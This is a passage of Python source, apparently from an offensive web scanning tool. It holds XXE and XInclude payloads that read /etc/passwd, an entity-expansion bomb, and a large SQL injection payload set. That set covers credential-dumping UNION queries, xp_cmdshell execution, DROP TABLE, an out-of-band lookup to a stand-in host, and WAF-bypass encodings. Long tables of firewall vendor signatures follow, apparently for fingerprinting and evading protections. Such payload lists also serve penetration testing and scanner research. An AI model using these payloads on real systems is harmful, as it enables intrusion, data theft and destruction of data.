        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></foo>",
        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://127.0.0.1/\"/></foo>",
        "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>",
        "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>",
    ],
}


SQLI_PAYLOAD_SEEDS = [
    ("bool-string", [
        "test' AND 1=1--",
        "test' AND 1=2--",
        "admin' OR '1'='1",
        "a' OR 'x'='x",
        "(test)' OR 1=1--",
        "test' AND 'a'='a",
        "x' OR 1=1 OR 'x'='y",
        "foo' OR 1=1 LIMIT 1--",
        "test') OR ('1'='1",
    ]),
    ("bool-numeric", [
        "1 AND 1=1--",
        "1 AND 1=2--",
        "0 OR 1=1--",
        "2-1 AND 1=1--",
        "1 AND TRUE--",
        "1) AND (1=1",
        "1)) OR ((1=1",
        "-1 OR 1=1--",
        "1 OR 2>1--",
    ]),
    ("error-mysql", [
        "test' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "test' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "test' AND EXP(~(SELECT * FROM (SELECT version())x))--",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "test' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
    ]),
    ("error-mssql", [
        "test' AND 1=CONVERT(INT,@@version)--",
        "test' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "1' AND 1 IN (SELECT @@version)--",
    ]),
    ("error-pgsql", [
        "test' AND 1=CAST((SELECT version()) AS NUMERIC)--",
        "test' AND 1=CAST((SELECT current_user) AS NUMERIC)--",
    ]),
    ("error-oracle", [
        "test' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE ROWNUM=1)||CHR(62))) FROM DUAL)--",
    ]),
    ("time-mysql", [
        "test' AND SLEEP(5)--",
        "test' OR SLEEP(5)--",
        "1 AND IF(1=1,SLEEP(5),0)--",
        "1 AND IF(ASCII(SUBSTRING(database(),1,1))>90,SLEEP(5),0)--",
        "test' AND BENCHMARK(5000000,MD5('test'))--",
        "test' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "test' AND ELT(1=1,SLEEP(5))--",
    ]),
    ("time-mssql", [
        "1; WAITFOR DELAY '0:0:5'--",
        "test'; WAITFOR DELAY '0:0:5'--",
    ]),
    ("time-pgsql", [
        "test' AND (SELECT 1 FROM PG_SLEEP(5))=1--",
        "1; SELECT pg_sleep(5)--",
    ]),
    ("time-oracle", [
        "test' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=1--",
    ]),
    ("time-sqlite", [
        "1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
    ]),
    ("union-1col", [
        "test' UNION SELECT NULL--",
        "-1' UNION SELECT 1--",
        "-1 UNION SELECT NULL--",
    ]),
    ("union-2col", [
        "test' UNION SELECT NULL,NULL--",
        "-1' UNION SELECT 1,2--",
        "test' UNION SELECT @@version,NULL--",
        "test' UNION SELECT user(),database()--",
    ]),
    ("union-3col", [
        "test' UNION SELECT NULL,NULL,NULL--",
        "-1' UNION SELECT 1,2,3--",
        "test' UNION SELECT 1,CONCAT(0x7e,@@version,0x7e),3--",
        "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
    ]),
    ("union-all", [
        "test' UNION ALL SELECT NULL,NULL--",
        "-1' UNION ALL SELECT 1,2,3--",
        "0' UNION SELECT username,password,3 FROM users--",
    ]),
    ("stacked", [
        "test'; SELECT 1--",
        "test'; INSERT INTO users VALUES(1,'hacked','hacked')--",
        "1; EXEC xp_cmdshell('whoami')--",
        "test'; DROP TABLE users--",
    ]),
    ("oob", [
        "test' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.oob.example.com\\\\a'))--",
    ]),
    ("generic-waf-bypass", [
        "' un/**/ion sel/**/ect 1,2,3--",
        "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
        "1/*comment*/AND/**/1=1/**/--",
        "1/*!12345UNION*//*!12345SELECT*/1--",
        "(1)AND(1)=(1)--",
    ]),
    ("whitespace-ws-bypass", [
        "%09AND%091=1%09--",
        "%0AAND%0A1=1%0A--",
        "%0DAND%0D1=1%0D--",
        "%0CAND%0C1=1%0C--",
        "%0BAND%0B1=1%0B--",
        "%A0AND%A01=1%A0--",
        "%09OR%091=1%09--",
        "%0AOR%0A1=1%0A--",
    ]),
    ("rlike-detection", [
        "1 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END))",
        "1 RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END))",
        "' RLIKE SLEEP(3)-- -",
        "' REGEXP 0x61646d696e-- -",
    ]),
    ("no-space-parens", [
        "(1)oR(1=1)--",
        "(1)aND(1=1)--",
        "'oR(2)LiKE(2)-- -",
        "'oR true-- -",
        "'||true-- -",
        "'||2=2-- -",
        "'oR'2'LiKE'2'-- -",
        "'oR'2'='2'oR'",
    ]),
    ("gbk-prefix", [
        "%bf' OR 1=1-- -",
        "%A8%27 OR 1=1-- -",
        "%8C%A8%27 OR 1=1-- -",
        "%bf') OR ('1'='1-- -",
    ]),
    ("union-no-space", [
        "'UniON(SElecT(1),2)-- -",
        "'UniON(SElecT(1),2,3)-- -",
        "'UniON(SElecT(1),2,3,4)-- -",
        "'UniON(SElecT(1),2,3,4,5)-- -",
    ]),
    ("auth-bypass-ext", [
        "admin'--",
        "admin' #",
        "admin'/*",
        "ffifdyop",
        "' or username like '%",
        "' group by password having 1=1--",
    ]),
    ("time-all-db", [
        "' AND SLEEP(3)-- -",
        "' OR SLEEP(3)-- -",
        "'; WAITFOR DELAY '0:0:3'-- -",
        "' AND pg_sleep(3)-- -",
        "' OR pg_sleep(3)-- -",
        "' AND RANDOMBLOB(300000000/2)-- -",
        "' AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))-- -",
        "' AND benchmark(5000000,MD5(1))-- -",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))x)-- -",
        "' AND (SELECT SLEEP(3) FROM dual WHERE 1=1)-- -",
    ]),
    ("union-col-detect", [
        "' ORDER BY 1-- -",
        "' ORDER BY 2-- -",
        "' ORDER BY 3-- -",
        "' ORDER BY 4-- -",
        "' ORDER BY 5-- -",
        "' ORDER BY 6-- -",
        "' ORDER BY 7-- -",
        "' ORDER BY 8-- -",
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
    ]),
    ("json-inline-sqli", [
        "' OR JSON_LENGTH('{}')<=8896-- -",
        "' OR JSON_VALID('1')-- -",
        "' UNION distinctrow SELECT NULL,NULL,NULL-- -",
        "' UNION distinctrow SELECT @@version,NULL,NULL-- -",
        "' OR JSON_OBJECT('a',1)=JSON_OBJECT('a',1)-- -",
        "' OR JSON_EXTRACT('{\"a\":1}','$.a')=1-- -",
    ]),
]


def _spread_sample(lst, n):
    if not lst:
        return []
    if len(lst) <= n:
        return list(lst)
    step = (len(lst) - 1) / float(n - 1) if n > 1 else 0
    return [lst[int(round(i * step))] for i in range(n)]


def _load_ext_sqli_seeds():
    return list(SQLI_PAYLOAD_SEEDS)


SQLI_PAYLOAD_SEEDS = _load_ext_sqli_seeds()


WAF_STATUS_CODES = {
    400, 403, 406, 419, 429, 503,
    405,
    493,
    999,
}

WAF_BODY_PATTERNS = [
    r"forbidden",
    r"blocked",
    r"access denied",
    r"request rejected",
    r"requested url was rejected",
    r"your support id is",
    r"your support id is:\s*\d+",
    r"please consult with your administrator",
    r"<title>request rejected</title>",
    r"detected as attack",
    r"request has been blocked",
    r"your ip.*(?:has been|is) blocked",
    r"security violation",
    r"malicious",
    r"illegal request",
    r"\bwaf\b",
    r"web application firewall",
    r"cloudflare",
    r"sucuri",
    r"incapsula",
    r"f5\s+big-ip",
    r"barracuda",
    r"modsecurity",
    r"mod_security",
    r"intrusion detected",
    r"attack detected",
    r"akamai",
    r"sorry.{0,30}blocked",
    r"error 1010",
    r"error 1006",
    r"error 1015",
    r"attention required",
    r"security check",
    r"ddos protection",
    r"please wait.*verifying",
    r"requested url was rejected",
    r"your support id is",
    r"please consult with your administrator",
    r"incapsula incident id",
    r"_incapsula_resource",
    r"this request has been blocked by website protection",
    r"this request has been blocked by.*firewall",
    r"unauthorized activity has been detected",
    r"condition intercepted",
    r"dotdefender blocked your request",
    r"security check by bitninja",
    r"visitor anti-robot validation",
    r"pardon our interruption",
    r"request forbidden by administrative rules",
    r"detected as attack",
    r"virus/spyware download blocked",
    r"request denied by watchguard firewall",
    r"generated by wordfence",
    r"ninjafirewall.*forbidden",
    r"senginx-robot-mitigation",
    r"powered by utm web protection",
    r"perimeterx\.com/whywasiblocked",
    r"your access has been intercepted",
    r"this request has been blocked by naxsi",
    r"sorry, this is not allowed",
    r"suspicious activity detected\. access to the site is blocked",
]

WAF_VENDOR_SIGNATURES = {
    "cloudflare": {
        "headers": [r"cf-ray", r"cf-cache-status", r"cf-request-id",
                    r"server:\s*cloudflare"],
        "body":    [r"cloudflare", r"error\s+101[05]", r"error\s+1020",
                    r"cf\.mitigate", r"attention required.*cloudflare",
                    r"ray\s+id:"],
        "status":  {403, 503},
    },
    "imperva": {
        "headers": [r"x-iinfo", r"incap_ses", r"visid_incap",
                    r"x-cdn:\s*imperva", r"x-protected-by:\s*incapsula"],
        "body":    [r"incapsula", r"incapsula incident id",
                    r"request blocked.*imperva", r"_incap_"],
        "status":  {403},
    },
    "modsecurity": {
        "headers": [r"server:.*mod_security", r"server:.*modsecurity",
                    r"x-powered-by:.*modsecurity"],
        "body":    [r"mod_security", r"modsecurity", r"rules?\s+violation",
                    r"not acceptable.*406", r"this error.*generated by mod"],
        "status":  {403, 406},
    },
    "f5": {
        "headers": [r"^ts[0-9a-f]{8,}", r"x-waf-status", r"server:\s*bigip",
                    r"x-cnection", r"^ts[0-9a-f]{8,}=[0-9a-f]{8,};"],
        "body":    [r"the requested url was rejected",
                    r"requested url was rejected",
                    r"f5\s+big.?ip",
                    r"your support id is",
                    r"your support id is:\s*\d+",
                    r"support id:",
                    r"please consult with your administrator",
                    r"please consult.*support id",
                    r"<title>request rejected</title>"],
        "status":  {200, 403},
    },
    "akamai": {
        "headers": [r"x-check-cacheable", r"akamai-grn",
                    r"x-akamai", r"server:\s*akamaighost"],
        "body":    [r"akamai", r"reference.*akamai",
                    r"access denied.*akamai", r"ghost"],
        "status":  {403},
    },
    "aws_waf": {
        "headers": [r"x-amzn-requestid", r"x-amz-cf-id",
                    r"x-amzn-trace-id"],
        "body":    [r"aws.*waf", r"403 forbidden.*aws",
                    r"request blocked by aws"],
        "status":  {403},
    },
    "barracuda": {
        "headers": [r"x-barracuda-waf", r"barra_counter_session"],
        "body":    [r"barracuda", r"barracuda web application firewall",
                    r"barracuda networks"],
        "status":  {400, 403},
    },
    "sucuri": {
        "headers": [r"x-sucuri-id", r"x-sucuri-cache"],
        "body":    [r"sucuri", r"access denied.*sucuri",
                    r"website firewall.*sucuri"],
        "status":  {403},
    },
    "fortinet": {
        "headers": [r"x-fw-", r"server:\s*fortigate", r"fortiwebsessid",
                    r"fortiwafsid="],
        "body":    [r"fortigate", r"fortiweb", r"fortinet",
                    r"your request was blocked by fortiweb",
                    r"\.fgd_icon", r"server unavailable\. please visit later"],
        "status":  {403},
    },
    "360_qihoo": {
        "headers": [r"x-powered-by-360wzb", r"wzws-ray", r"server:\s*qianxin-waf"],
        "body":    [r"wzws-waf-cgi", r"wangshan\.360\.cn",
                    r"your access has been intercepted because your links may threaten"],
        "status":  {493},
    },
    "aesecure": {
        "headers": [r"aesecure-code"],
        "body":    [r"aesecure_denied\.png"],
        "status":  {403},
    },
    "airlock": {
        "headers": [r"set-cookie:.*\bal-sess\b", r"set-cookie:.*\bal-lb\b"],
        "body":    [r"server detected a syntax error in your request",
                    r"check your request and all parameters"],
        "status":  {400, 403},
    },
    "alert_logic": {
        "headers": [],
        "body":    [r"we are sorry, but the page you are looking for cannot be found",
                    r"the page has either been removed, renamed or temporarily unavailable"],
        "status":  {404},
    },
    "aliyundun": {
        "headers": [],
        "body":    [r"sorry, your request has been blocked as it may cause potential threats",
                    r"errors\.aliyun\.com"],
        "status":  {405},
    },
    "anquanbao": {
        "headers": [r"x-powered-by-anquanbao"],
        "body":    [r"/aqb_cc/error/", r"hidden_intercept_time"],
        "status":  {405},
    },
    "anyu": {
        "headers": [r"wzws-ray"],
        "body":    [r"your access has been intercepted by anyu",
                    r"anyu.*the green channel"],
        "status":  {403},
    },
    "approach": {
        "headers": [r"server:\s*approach"],
        "body":    [r"approach web application firewall framework",
                    r"your ip address has been logged.*track",
                    r"approach infrastructure team"],
        "status":  {403},
    },
    "armor_defense": {
        "headers": [],
        "body":    [r"this request has been blocked by website protection from armor",
                    r"if you manage this domain please create an armor support ticket"],
        "status":  {403},
    },
    "arvancloud": {
        "headers": [r"server:\s*arvancloud"],
        "body":    [],
        "status":  {403},
    },
    "aspa_waf": {
        "headers": [r"server:\s*aspa-waf", r"aspa-cache-status"],
        "body":    [],
        "status":  {403},
    },
    "astra": {
        "headers": [r"set-cookie:.*cz_astra_csrf_cookie"],
        "body":    [r"sorry, this is not allowed",
                    r"our website protection system has detected an issue",
                    r"getastra\.com"],
        "status":  {403},
    },
    "aws_elb": {
        "headers": [r"set-cookie:.*awsalb", r"x-amz-id", r"x-amz-request-id",
                    r"server:\s*awselb"],
        "body":    [r"access denied", r"<requestid>[a-z0-9]{20,25}</requestid>"],
        "status":  {403},
    },
    "baidu_yunjiasu": {
        "headers": [r"server:\s*yunjiasu"],
        "body":    [],
        "status":  {403},
    },
    "barikode": {
        "headers": [],
        "body":    [r"\bbarikode\b", r"forbidden access"],
        "status":  {403},
    },
    "bekchy": {
        "headers": [r"bekchy.*access denied"],
        "body":    [r"bekchy\.com/report"],
        "status":  {403},
    },
    "binarysec": {
        "headers": [r"x-binarysec-via", r"x-binarysec-nocache",
                    r"server:\s*binarysec"],
        "body":    [],
        "status":  {403},
    },
    "bitninja": {
        "headers": [],
        "body":    [r"security check by bitninja",
                    r"your ip will be removed from bitninja",
                    r"visitor anti-robot validation"],
        "status":  {403},
    },
    "blockdos": {
        "headers": [r"server:\s*blockdos\.net"],
        "body":    [],
        "status":  {403},
    },
    "bluedon": {
        "headers": [r"server:\s*bdwaf"],
        "body":    [r"bluedon web application firewall"],
        "status":  {403},
    },
    "bulletproof_security": {
        "headers": [],
        "body":    [r"id=[\"']?bpsmessage[\"']?",
                    r"if you arrived here due to a search or clicking on a link"],
        "status":  {403},
    },
    "cdnns_gateway": {
        "headers": [],
        "body":    [r"cdnns\s*waf\s*application\s*gateway",
                    r"cdnnswaf application gateway"],
        "status":  {403},
    },
    "cerber": {
        "headers": [],
        "body":    [r"we.re sorry, you are not allowed to proceed",
                    r"your request looks suspicious or similar to automated requests"],
        "status":  {403},
    },
    "chaitin_safeline": {
        "headers": [],
        "body":    [r"<!--.*event_id.*-->"],
        "status":  {403},
    },
    "chinacache": {
        "headers": [r"powered-by-chinacache"],
        "body":    [],
        "status":  {403},
    },
    "cloudbric": {
        "headers": [],
        "body":    [r"malicious code detected",
                    r"your request was blocked by cloudbric",
                    r"cloudbric\.zendesk\.com",
                    r"<title>cloudbric\s*\|\s*error"],
        "status":  {403},
    },
    "cloudfloordns": {
        "headers": [r"server:\s*cloudfloordns\s*waf"],
        "body":    [r"cloudfloordns.*web application firewall error",
                    r"cloudfloordns\.com/contact"],
        "status":  {403},
    },
    "cloudfront": {
        "headers": [],
        "body":    [r"generated by cloudfront"],
        "status":  {403},
    },
    "comodo_cwatch": {
        "headers": [r"server:\s*protected by comodo waf"],
        "body":    [],
        "status":  {403},
    },
    "crawlprotect": {
        "headers": [r"set-cookie:.*crawlprotect"],
        "body":    [r"this site is protected by crawlprotect"],
        "status":  {403},
    },
    "deny_all": {
        "headers": [r"set-cookie:.*sessioncookie"],
        "body":    [r"condition intercepted"],
        "status":  {403},
    },
    "distil": {
        "headers": [r"x-distil-cs"],
        "body":    [r"pardon our interruption",
                    r"something about your browser made us think that you are a bot"],
        "status":  {403},
    },
    "dosarrest": {
        "headers": [r"x-dis-request-id", r"server:\s*dosarrest"],
        "body":    [],
        "status":  {403},
    },
    "dotdefender": {
        "headers": [r"x-dotdefender-denied"],
        "body":    [r"dotdefender blocked your request"],
        "status":  {403},
    },
    "dynamicweb_injcheck": {
        "headers": [r"x-403-status-by:\s*dw-inj-check"],
        "body":    [],
        "status":  {403},
    },
    "e3learning_security": {
        "headers": [r"server:\s*e3learning_waf"],
        "body":    [],
        "status":  {403},
    },
    "edgecast": {
        "headers": [],
        "body":    [r"please contact the site administrator.*reference id.*edgecast",
                    r"edgecast web application firewall.*verizon"],
        "status":  {400},
    },
    "eisoo_cloud": {
        "headers": [r"server:\s*eisoowaf", r"server:\s*eisoowaf-azure"],
        "body":    [r"eisoo-firewall-block\.css", r"www\.eisoo\.com",
                    r"eisoo\s+inc\."],
        "status":  {403},
    },
    "godaddy": {
        "headers": [],
        "body":    [r"access denied.*godaddy website firewall"],
        "status":  {403},
    },
    "greywizard": {
        "headers": [r"server:\s*greywizard"],
        "body":    [r"grey wizard",
                    r"contact the website owner or grey wizard",
                    r"we.ve detected attempted attack or non standard traffic"],
        "status":  {403},
    },
    "huawei_cloud": {
        "headers": [],
        "body":    [r"account\.hwclouds\.com/static/error",
                    r"www\.hwclouds\.com",
                    r"hws_security@"],
        "status":  {403},
    },
    "hyperguard": {
        "headers": [r"set-cookie:.*\bodsession="],
        "body":    [],
        "status":  {403},
    },
    "ibm_datapower": {
        "headers": [r"x-backside-transport"],
        "body":    [],
        "status":  {403},
    },
    "imunify360": {
        "headers": [r"server:\s*imunify360-webshield"],
        "body":    [r"powered by imunify360", r"protected by imunify360"],
        "status":  {403},
    },
    "indusguard": {
        "headers": [r"server:\s*if_waf", r"x-version"],
        "body":    [r"further investigation and remediation with a screenshot"],
        "status":  {403},
    },
    "instart_dx": {
        "headers": [r"x-instart-request-id", r"x-instart-wl",
                    r"x-instart-cache"],
        "body":    [r"the requested url was rejected\. please consult with your administrator"],
        "status":  {403},
    },
    "isa_server": {
        "headers": [],
        "body":    [r"the isa server denied the specified uniform resource locator",
                    r"contact the server administrator"],
        "status":  {403},
    },
    "janusec": {
        "headers": [],
        "body":    [r"janusec application gateway"],
        "status":  {403},
    },
    "jiasule": {
        "headers": [r"server:\s*jiasule-waf",
                    r"set-cookie:.*__jsluid=", r"set-cookie:.*jsl_tracking"],
        "body":    [r"static\.jiasule\.com", r"notice-jiasule"],
        "status":  {403},
    },
    "keycdn": {
        "headers": [r"server:\s*keycdn"],
        "body":    [],
        "status":  {403},
    },
    "knownsec": {
        "headers": [],
        "body":    [r"ks-waf-error\.png"],
        "status":  {403},
    },
    "litespeed": {
        "headers": [r"server:\s*litespeed"],
        "body":    [r"proudly powered by litespeed",
                    r"litespeedtech\.com/error-page",
                    r"access to resource on this server is denied"],
        "status":  {403},
    },
    "malcare": {
        "headers": [],
        "body":    [r"blocked because of malicious activities",
                    r"firewall powered by malcare"],
        "status":  {403},
    },
    "mission_control": {
        "headers": [r"server:\s*mission control application shield"],
        "body":    [],
        "status":  {403},
    },
    "naxsi": {
        "headers": [r"x-data-origin:\s*naxsi/waf",
                    r"server:\s*naxsi"],
        "body":    [r"this request has been blocked by naxsi"],
        "status":  {403},
    },
    "nemesida": {
        "headers": [],
        "body":    [r"suspicious activity detected\. access to the site is blocked",
                    r"nwaf@"],
        "status":  {403},
    },
    "netcontinuum": {
        "headers": [r"set-cookie:.*nci__sessionid="],
        "body":    [],
        "status":  {403},
    },
    "netscaler_appfirewall": {
        "headers": [r"nncoection", r"set-cookie:.*ns_af=",
                    r"set-cookie:.*citrix_ns_id", r"set-cookie:.*\bnsc_",
                    r"ns-cache"],
        "body":    [],
        "status":  {403},
    },
    "nevisproxy": {
        "headers": [r"set-cookie:.*navajo"],
        "body":    [],
        "status":  {403},
    },
    "newdefend": {
        "headers": [r"server:\s*newdefend"],
        "body":    [r"newdefend\.com/feedback", r"/nd_block/"],
        "status":  {403},
    },
    "nexusguard": {
        "headers": [],
        "body":    [r"speresources\.nexusguard\.com"],
        "status":  {403},
    },
    "ninjafirewall": {
        "headers": [],
        "body":    [r"for security reasons, it was blocked and logged",
                    r"ninjafirewall:\s*403 forbidden"],
        "status":  {403},
    },
    "nsfocus": {
        "headers": [r"server:\s*nsfocus"],
        "body":    [],
        "status":  {403},
    },
    "nullddos": {
        "headers": [r"server:\s*nullddos\s*system"],
        "body":    [],
        "status":  {403},
    },
    "onmessage_shield": {
        "headers": [r"x-engine:\s*onmessage\s*shield"],
        "body":    [r"blackbaud\s*k-12",
                    r"https://status\.blackbaud\.com",
                    r"https://maintenance\.blackbaud\.com"],
        "status":  {403},
    },
    "openresty_lua_waf": {
        "headers": [r"server:\s*openresty"],
        "body":    [r"openresty/"],
        "status":  {406},
    },
    "palo_alto": {
        "headers": [],
        "body":    [r"virus/spyware download blocked",
                    r"palo alto next generation security platform"],
        "status":  {403},
    },
    "pentawaf": {
        "headers": [r"server:\s*pentawaf"],
        "body":    [r"pentawaf/"],
        "status":  {403},
    },
    "perimeterx": {
        "headers": [],
        "body":    [r"perimeterx\.com/whywasiblocked"],
        "status":  {403},
    },
    "pkSecurityModule": {
        "headers": [],
        "body":    [r"pksecuritymodule.*security\.alert",
                    r"a safety critical request was discovered and blocked"],
        "status":  {403},
    },
    "positive_tech_af": {
        "headers": [],
        "body":    [r"request id:.*\d{4}-\d{2}-\d{2}-\d{2}-\d{2}-\d{2}"],
        "status":  {403},
    },
    "powercdn": {
        "headers": [r"via:.*powercdn\.com", r"x-cache:.*powercdn\.com",
                    r"x-cdn:\s*powercdn"],
        "body":    [],
        "status":  {403},
    },
    "profense": {
        "headers": [r"server:\s*profense", r"set-cookie:.*plbsid="],
        "body":    [],
        "status":  {403},
    },
    "proventia_ibm": {
        "headers": [],
        "body":    [r"request does not match proventia rules"],
        "status":  {403},
    },
    "puhui": {
        "headers": [r"server:\s*puhuiwaf"],
        "body":    [],
        "status":  {403},
    },
    "qiniu_cdn": {
        "headers": [r"x-qiniu-cdn"],
        "body":    [],
        "status":  {403},
    },
    "radware_appwall": {
        "headers": [r"x-sl-compstate"],
        "body":    [r"unauthorized activity has been detected",
                    r"case\s+number",
                    r"radwarealerting@",
                    r"<title>unauthorized request blocked</title>"],
        "status":  {403},
    },
    "reblaze": {
        "headers": [r"server:\s*reblaze", r"set-cookie:.*rbzid="],
        "body":    [r"access denied.*\(403\)",
                    r"current session has been terminated"],
        "status":  {403},
    },
    "request_validation_mode": {
        "headers": [r"x-powered-by:\s*asp\.net"],
        "body":    [r"asp\.net has detected data in the request that is potentially dangerous",
                    r"request validation has detected a potentially dangerous client input value",
                    r"httprequestvalidationexception"],
        "status":  {500},
    },
    "rsfirewall": {
        "headers": [],
        "body":    [r"com_rsfirewall_403_forbidden", r"com_rsfirewall_event"],
        "status":  {403},
    },
    "sabre": {
        "headers": [],
        "body":    [r"dxsupport@sabre\.com", r"your request has been blocked"],
        "status":  {500},
    },
    "safe3": {
        "headers": [r"x-powered-by:\s*safe3waf",
                    r"server:\s*safe3 web firewall"],
        "body":    [r"safe3waf"],
        "status":  {403},
    },
    "safedog": {
        "headers": [r"server:\s*waf/2\.0", r"server:\s*safedog"],
        "body":    [],
        "status":  {403},
    },
    "secking": {
        "headers": [r"server:\s*seckingwaf", r"server:\s*secking/"],
        "body":    [],
        "status":  {403},
    },
    "secupress": {
        "headers": [],
        "body":    [r"secupress", r"block id:.*bad url contents"],
        "status":  {503},
    },
    "secure_entry": {
        "headers": [r"server:\s*secure entry server",
                    r"secure entry server"],
        "body":    [],
        "status":  {403},
    },
    "secureiis": {
        "headers": [],
        "body":    [r"download\s+secureiis\s+personal\s+edition",
                    r"eeye\.com/secureiis",
                    r"secureiis\s+error"],
        "status":  {403},
    },
    "senginx": {
        "headers": [],
        "body":    [r"senginx-robot-mitigation"],
        "status":  {403},
    },
    "serverdefender_vp": {
        "headers": [r"x-pint:\s*p80"],
        "body":    [],
        "status":  {403},
    },
    "shadow_daemon": {
        "headers": [],
        "body":    [r"request forbidden by administrative rules"],
        "status":  {403},
    },
    "shield_security": {
        "headers": [],
        "body":    [r"you were blocked by the shield",
                    r"something in the url, form or cookie data wasn.t appropriate"],
        "status":  {403},
    },
    "siteground": {
        "headers": [],
        "body":    [r"the page you are trying to access is restricted due to a security rule"],
        "status":  {403},
    },
    "siteguard_jp": {
        "headers": [],
        "body":    [r"powered by siteguard",
                    r"the server refuse to browse the page"],
        "status":  {403},
    },
    "sitelock_trueshield": {
        "headers": [],
        "body":    [r"www\.sitelock\.com",
                    r"sitelock is leader in business website security",
                    r"sitelock_shield_logo"],
        "status":  {403},
    },
    "sonicwall": {
        "headers": [r"server:\s*sonicwall"],
        "body":    [r"this request is blocked by the sonicwall",
                    r"web site blocked",
                    r"nsa_banner"],
        "status":  {403},
    },
    "sophos_utm": {
        "headers": [],
        "body":    [r"powered by utm web protection"],
        "status":  {403},
    },
    "squidproxy_ids": {
        "headers": [r"server:\s*squid/"],
        "body":    [r"access control configuration prevents your request"],
        "status":  {403},
    },
    "stackpath": {
        "headers": [],
        "body":    [r"you performed an action that triggered the service and blocked your request"],
        "status":  {403},
    },
    "stingray": {
        "headers": [r"x-mapping"],
        "body":    [],
        "status":  {403, 500},
    },
    "synology_cloud": {
        "headers": [],
        "body":    [r"copyright.*\d{4}\s+synology\s+inc"],
        "status":  {403},
    },
    "tencent_cloud": {
        "headers": [],
        "body":    [r"waf\.tencent-cloud\.com"],
        "status":  {405},
    },
    "teros": {
        "headers": [r"set-cookie:.*\bst8id\b"],
        "body":    [],
        "status":  {403},
    },
    "trafficshield": {
        "headers": [r"server:\s*f5-trafficshield",
                    r"set-cookie:.*\basinfo="],
        "body":    [],
        "status":  {403},
    },
    "transip": {
        "headers": [r"x-transip-backend", r"x-transip-balancer"],
        "body":    [],
        "status":  {403},
    },
    "ucloud_uewaf": {
        "headers": [r"server:\s*uewaf/"],
        "body":    [r"uewaf_deny_pages", r"ucloud\.cn"],
        "status":  {403},
    },
    "urlmaster_securitycheck": {
        "headers": [r"urlmaster", r"urlrewritemodule", r"securitycheck"],
        "body":    [],
        "status":  {400},
    },
    "urlscan": {
        "headers": [],
        "body":    [r"rejected-by-urlscan", r"server erro in application"],
        "status":  {403},
    },
    "varnish_owasp": {
        "headers": [],
        "body":    [r"request rejected by xvarnish-waf"],
        "status":  {404},
    },
    "varnish_cachewall": {
        "headers": [],
        "body":    [r"error 403 naughty, not nice", r"varnish cache"],
        "status":  {403},
    },
    "viettel": {
        "headers": [],
        "body":    [r"access denied.*viettel waf",
                    r"cloudrity\.com\.vn",
                    r"viettel waf system"],
        "status":  {403},
    },
    "virusdie": {
        "headers": [],
        "body":    [r"cdn\.virusdie\.ru/splash/firewallstop\.png",
                    r"virusdie\.ru",
                    r"name=[\"']?fw_block[\"']?"],
        "status":  {403},
    },
    "wallarm": {
        "headers": [r"server:\s*nginx-wallarm"],
        "body":    [],
        "status":  {403},
    },
    "watchguard": {
        "headers": [r"server:\s*watchguard"],
        "body":    [r"request denied by watchguard firewall",
                    r"watchguard technologies inc"],
        "status":  {403},
    },
    "webarx": {
        "headers": [],
        "body":    [r"this request has been blocked by webarx web application firewall"],
        "status":  {403},
    },
    "webknight": {
        "headers": [r"webknight"],
        "body":    [r"webknight application firewall alert",
                    r"aqtronix\s+webknight"],
        "status":  {999, 404},
    },
    "webland": {
        "headers": [r"server:\s*apache protected by webland waf"],
        "body":    [],
        "status":  {403},
    },
    "webray": {
        "headers": [r"server:\s*webray-waf", r"drivedby:\s*raysrv"],
        "body":    [],
        "status":  {403},
    },
    "webseal": {
        "headers": [r"server:\s*webseal"],
        "body":    [r"this is a webseal error message",
                    r"webseal server received an invalid http request"],
        "status":  {403},
    },
    "webtotem": {
        "headers": [],
        "body":    [r"the current request was blocked by webtotem"],
        "status":  {403},
    },
    "west263cdn": {
        "headers": [r"x-cache:\s*wt263cdn"],
        "body":    [],
        "status":  {403},
    },
    "wordfence": {
        "headers": [],
        "body":    [r"generated by wordfence",
                    r"a potentially unsafe operation has been detected in your request",
                    r"your access to this site has been limited",
                    r"this response was generated by wordfence"],
        "status":  {403},
    },
    "wts_waf": {
        "headers": [r"server:\s*wts"],
        "body":    [r"wts-waf"],
        "status":  {403},
    },
    "xlabs_security": {
        "headers": [r"x-cdn:\s*xlabs\s*security"],
        "body":    [],
        "status":  {403},
    },
    "xuanwudun": {
        "headers": [],
        "body":    [r"admin\.dbappwaf\.cn"],
        "status":  {403},
